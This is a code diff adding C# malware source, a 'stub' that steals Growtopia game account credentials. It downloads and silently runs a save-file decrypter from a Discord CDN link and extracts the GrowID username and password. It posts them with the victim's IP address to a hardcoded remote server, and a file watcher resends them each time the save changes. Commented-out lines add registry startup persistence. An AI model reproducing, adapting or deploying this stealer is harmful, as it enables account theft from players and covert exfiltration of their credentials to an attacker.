@@ -1,0 +1,218 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using System.Web;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.Net.Mail;
+using System.Net.Mime;
+using System.Net.NetworkInformation;
+using Microsoft.Win32;
+using System.Threading;
+using System.Net.Http.Headers;
+using System.Management;
+using System.Globalization;
+using System.Reflection;
+using System.Windows.Forms;
+
+namespace PallemyStub
+{
+    class Program
+    {
+        public static string dirPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia";
+        public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
+        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher(); //
+        static string SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
+        static string FuckGtPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\game";
+        public static string GetLastWorld()
+        {
+            try
+            {
+                string str1 = (string)null;
+                System.IO.File.Open(SaveDatPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                using (FileStream fileStream = new FileStream(SaveDatPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    using (StreamReader streamReader = new StreamReader((Stream)fileStream, Encoding.Default))
+                        str1 = streamReader.ReadToEnd();
+                }
+                Regex regex = new Regex("[^\\w0-9]");
+                string str2 = str1.Replace("\0", " ");
+                return regex.Replace(str2.Substring(str2.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty) ?? "Not Found";
+            }
+            catch
+            {
+                return "";
+            }
+
+        }
+        public static void ExtractResource(string FileName, string Name)
+        {
+            Assembly assembly = Assembly.GetCallingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(FileName))
+            {
+                byte[] bytes = new byte[(int)stream.Length];
+                stream.Read(bytes, 0, bytes.Length);
+                File.WriteAllBytes(Name, bytes);
+            }
+        }
+        public static string PostSave(string growid, string password, string owner)
+        {
+            Random generator = new Random();
+            int r = generator.Next(100000, 1000000);
+            string url = "http://45.155.124.146/S4UCKSMYLIFE/postdata.php";
+            string ip = new WebClient().DownloadString("http://icanhazip.com");
+            ip = ip.Substring(0, ip.Length - 1);
+            var time = DateTime.Now.ToFileTime();
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            request.Method = "POST";
+            request.ContentType = "application/x-www-form-urlencoded";
+            string data = "id=" + r + "&growid=" + HttpUtility.UrlEncode(growid) + "&password=" + HttpUtility.UrlEncode(password) + "&ip=" + ip + "&computer=" + "baran" + "&owner=" + owner;
+            request.ContentLength = data.Length;
+            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
+            writer.Write(data);
+            writer.Flush();
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            string encoding = response.ContentEncoding;
+            if (encoding == null || encoding.Length < 1)
+            {
+                encoding = "UTF-8";
+            }
+            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
+            data = reader.ReadToEnd();
+            response.Close();
+            return data;
+        }
+        static void Main(string[] args)
+        {
+            //using (RegistryKey regk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            //{
+            //try { regk.SetValue(Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName), @"""" + AppDomain.CurrentDomain.BaseDirectory + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName) + @""""); } catch { }
+            //}
+            //bindmethod
+            //startup
+            try
+            {
+                bool fuckgt = false;
+                if (fuckgt == true)
+                {
+                    if (Directory.Exists(FuckGtPath))
+                    {
+                        Directory.Delete(FuckGtPath);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                Application.DoEvents();
+            }
+            string fileName = Path.GetTempPath() + "\\pass.txt";
+            FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
+            fs.Close();
+            string fileNamea = Path.GetTempPath() + "\\user.txt";
+            FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
+            fsa.Close();
+            WebClient wc = new WebClient();
+
+            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");
+
+
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = Path.GetTempPath() + "\\decode.exe",
+                WindowStyle = ProcessWindowStyle.Hidden
+            }).WaitForExit();
+            #region GrowIDPasswordOku
+            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
+            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
+            #endregion
+
+
+
+            if (username == "" || password == "")
+            {
+                Console.WriteLine("password or username doesnt found");
+            }
+            else
+            {
+                PostSave(username, password, "//user//");
+
+            }
+            File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
+            #region SaveDecrypterDosyalariniSil
+            File.Delete(Path.GetTempPath() + "\\user.txt");
+            File.Delete(Path.GetTempPath() + "\\pass.txt");
+            #endregion
+
+            fileSystemWatcher.Path = dirPath;
+            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
+            fileSystemWatcher.Filter = "*.dat";
+            fileSystemWatcher.Changed += OnSaveChanged;
+            fileSystemWatcher.EnableRaisingEvents = true;
+            while (true)
+            {
+                System.Threading.Thread.Sleep(1000);
+            }
+
+
+        }
+        private static void OnSaveChanged(object source, FileSystemEventArgs e)
+        {
+
+
+            if (e.FullPath == savePath)
+            {
+                try
+                {
+
+                    #region DosyalariOlusturVeOku
+                    string fileName = Path.GetTempPath() + "\\pass.txt";
+                    FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
+                    fs.Close();
+                    string fileNamea = Path.GetTempPath() + "\\user.txt";
+                    FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
+                    fsa.Close();
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = Path.GetTempPath() + "\\decode.exe",
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    }).WaitForExit();
+                    #endregion
+                    #region GrowIDPasswordOku
+                    string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
+                    string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
+                    #endregion
+
+                    Console.WriteLine(e.FullPath);
+                    Console.WriteLine(savePath);
+                    Console.WriteLine(e.ChangeType.ToString());
+                    fileSystemWatcher.EnableRaisingEvents = false;
+                    string read = File.ReadAllText(Path.GetTempPath() + "\\antispam.txt");
+                    if (read != username + password)
+                    {
+                        File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
+                        if (username == "" || password == "")
+                        {
+                            Console.WriteLine("password or username doesnt found");
+                        }
+                        else
+                        {
+                            PostSave(username, password, "//user//");
+
+                        }
+
+                    }
+                }
+                finally
+                {
+                    fileSystemWatcher.EnableRaisingEvents = true;
+                }
+            }
+        }
+    }
+}
